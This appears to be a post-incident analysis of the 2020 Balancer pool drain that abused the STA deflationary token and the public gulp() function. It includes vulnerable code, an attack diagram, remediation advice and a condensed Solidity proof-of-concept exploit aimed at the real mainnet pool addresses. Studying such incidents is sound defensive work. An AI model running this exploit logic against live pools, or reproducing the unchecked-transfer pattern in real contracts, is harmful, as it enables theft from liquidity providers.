# Balancer — Deflationary Token Price Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2020-06-28 |
| **Protocol** | Balancer Protocol |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~$500,000 (WETH) |
| **Attacker** | [Attacker Address](https://etherscan.io/address/0x09923e09FDECE38e3f843A1508Ef56b8fc66e9A8) |
| **Attack Tx** | [0x013be977...](https://etherscan.io/tx/0x013be97768b702fe8eccef1a40544d5ecb3c1961ad5f87fee4d16fdc08c78106) |
| **Vulnerable Contract** | [0x0e511Aa1a137AaD267dfe3a6bFCa0b856C1a3682](https://etherscan.io/address/0x0e511Aa1a137AaD267dfe3a6bFCa0b856C1a3682) |
| **Root Cause** | Pool balance discrepancy due to incompatibility with deflationary token (STA) that charges a transfer fee |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2020-06/Balancer_20200628_exp.sol) |

---
## 1. Vulnerability Overview

Balancer is an AMM that holds multiple tokens in a single pool and automatically adjusts prices. STA (Statera) is a deflationary token that burns 1% of every transfer. Balancer's swap function trusted the input amount without actually verifying the quantity of tokens received. This allowed the attacker to repeatedly swap until the pool's STA balance was reduced to 1, synchronize the records via the `gulp()` function, artificially inflate the STA price to an extreme level, and drain WETH from the pool.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Balancer swapExactAmountIn pseudocode (vulnerable)
function swapExactAmountIn(
    address tokenIn,
    uint256 tokenAmountIn,   // ❌ Trusts input value rather than actual amount received
    address tokenOut,
    uint256 minAmountOut,
    uint256 maxPrice
) external returns (uint256 tokenAmountOut, uint256 spotPriceAfter) {

    // ❌ tokenAmountIn may differ from the actual amount transferred (deflationary token)
    // STA burns 1% on transfer → actual received = tokenAmountIn * 0.99
    uint256 inRecord_balance = _records[tokenIn].balance;

    // ❌ Internal balance record is incremented by tokenAmountIn
    // Only tokenAmountIn * 0.99 was actually received, but tokenAmountIn is recorded
    _records[tokenIn].balance = inRecord_balance + tokenAmountIn;

    // Price calculation and token transfer...
}

// ✅ Correct pattern
function swapExactAmountIn(...) external {
    uint256 balanceBefore = IERC20(tokenIn).balanceOf(address(this));
    IERC20(tokenIn).transferFrom(msg.sender, address(this), tokenAmountIn);
    uint256 actualReceived = IERC20(tokenIn).balanceOf(address(this)) - balanceBefore;

    // ✅ Update balance with the actual amount received
    _records[tokenIn].balance = inRecord_balance + actualReceived;
}

// gulp(): Force-syncs internal records to the actual balance (exploited by attacker)
function gulp(address token) external {
    // ❌ This function becomes a manipulation tool for the attacker
    _records[token].balance = IERC20(token).balanceOf(address(this));
}
```

---
### On-Chain Original Code

Source: Sourcify verified


**BPool.sol** — Entry point:
```solidity
// ❌ Root cause: Pool balance discrepancy due to incompatibility with deflationary token (STA) that charges a transfer fee
    function _pullUnderlying(address erc20, address from, uint amount)
        internal
    {
        bool xfer = IERC20(erc20).transferFrom(from, address(this), amount);  // ❌ Unchecked transferFrom
        require(xfer, "ERR_ERC20_FALSE");
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] dYdX Flash Loan: Borrow large amount of WETH
    │
    ├─[2] Swap large amount WETH → STA (swapExactAmountIn)
    │       Pool: STA decreases, WETH increases
    │
    ├─[3] Swap large amount STA → WETH
    │       1% burned on STA transfer → pool's actual STA < recorded STA
    │
    ├─[4] Repeat steps [2]~[3] dozens of times
    │       Goal: pool's actual STA balance = 1 (minimum value)
    │
    ├─[5] Call gulp(STA)
    │       Sync internal record to actual balance (1)
    │       → STA price = effectively infinite
    │
    ├─[6] Exchange 1 STA for large amount of WETH
    │       swapExactAmountOut(WETH, MAX, STA, pool_STA-1, MAX)
    │       → Withdraw nearly all WETH
    │
    ├─[7] Repeatedly call gulp(STA) and swap 1 STA for WETH 20 times
    │
    └─[8] Repay flash loan + realize profit
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface BPool {
    function swapExactAmountIn(
        address tokenIn, uint256 tokenAmountIn,
        address tokenOut, uint256 minAmountOut, uint256 maxPrice
    ) external returns (uint256 tokenAmountOut, uint256 spotPriceAfter);

    function gulp(address token) external;       // Sync records to actual balance
    function getBalance(address token) external view returns (uint256);

    function swapExactAmountOut(
        address tokenIn, uint256 maxAmountIn,
        address tokenOut, uint256 tokenAmountOut, uint256 maxPrice
    ) external;
}

contract BalancerExp is Test {
    address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address sta  = 0xa7DE087329BFcda5639247F96140f9DAbe3DeED1; // Deflationary token
    BPool bpool  = BPool(0x0e511Aa1a137AaD267dfe3a6bFCa0b856C1a3682);

    uint256 public constant BONE = 10**18;
    uint256 public constant MAX_IN_RATIO = BONE / 2;

    // dYdX flash loan callback
    function callFunction(address, AccountInfo memory, bytes memory) external {
        bpool.gulp(weth); // Initialize pool state

        // [Step 1] Buy STA with half of WETH (causing large price impact)
        uint256 MaxinRatio = bmul(bpool.getBalance(weth), MAX_IN_RATIO);
        bpool.swapExactAmountIn(weth, MaxinRatio - 1e18, sta, 0, 9999 * 1e18);

        // [Step 2] Swap entire STA balance back to WETH
        // STA burns 1% on transfer → discrepancy between pool records and actual balance accumulates
        bpool.swapExactAmountIn(sta, IERC20(sta).balanceOf(address(this)), weth, 0, 9999 * 1e18);

        // [Step 3] Repeatedly swap with adjusted ratios to reduce STA balance to 1
        // ... (16-iteration loop)
        for (uint256 i = 0; i < 16; i++) {
            MaxinRatio = bmul(bpool.getBalance(weth), MAX_IN_RATIO);
            bpool.swapExactAmountIn(weth, (MaxinRatio * 95) / 100, sta, 0, 9999 * 1e18);
        }

        // [Step 4] Use swapExactAmountOut to leave only 1 STA in the pool
        bpool.swapExactAmountOut(weth, 99_999_999_999 * 1e18, sta,
            IERC20(sta).balanceOf(address(bpool)) - 1, 99_999 * 1e18);

        // [Step 5] Use gulp to sync internal records to actual balance (1)
        // → 1 STA is now priced at the entire pool's worth of WETH
        bpool.gulp(sta);

        // [Step 6] Swap 1 STA at a time for WETH (extremely favorable price)
        for (uint256 j = 0; j < 20; j++) {
            bpool.swapExactAmountIn(sta, 1, weth, 0, 9999 * 1e18);
            bpool.gulp(sta); // Sync after each swap to maintain price
        }
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Deflationary Token Incompatibility (Fee-on-Transfer Token Incompatibility) |
| **Contributing Factor** | Price Manipulation |
| **Attack Vector** | Flash Loan (dYdX) |
| **Key Functions** | `swapExactAmountIn`, `gulp` |
| **Precondition** | A fee-on-transfer token is included in the pool |
| **CWE** | CWE-682: Incorrect Calculation |
| **Impact** | Full pool liquidity drain possible |

---
## 6. Remediation Recommendations

1. **Validate actual received amount**: Compare `balanceOf` before and after the swap to verify the actual quantity of tokens received.
2. **Block deflationary tokens**: Reject pool registration of fee-on-transfer tokens, or implement dedicated handling for them.
3. **Restrict access to gulp function**: The publicly callable `gulp` function is susceptible to abuse; restrict its permissions.
4. **Minimum balance protection**: Set a lower bound to prevent token balances in the pool from falling below a certain threshold.

---
## 7. Lessons Learned

- **Risk of token standard diversity**: Tokens that comply with the ERC20 standard while adding extra behavior (transfer fees, burns, etc.) are increasing. AMMs must explicitly handle such non-standard behavior.
- **Risk of the gulp pattern**: The `gulp` function that force-syncs pool balances is useful in normal circumstances, but becomes a price manipulation tool when an attacker intentionally manipulates the balance before calling it.
- **Amplification effect of flash loans**: Flash loans enable large-scale attacks without any upfront capital. Protocol design must always account for flash loan scenarios.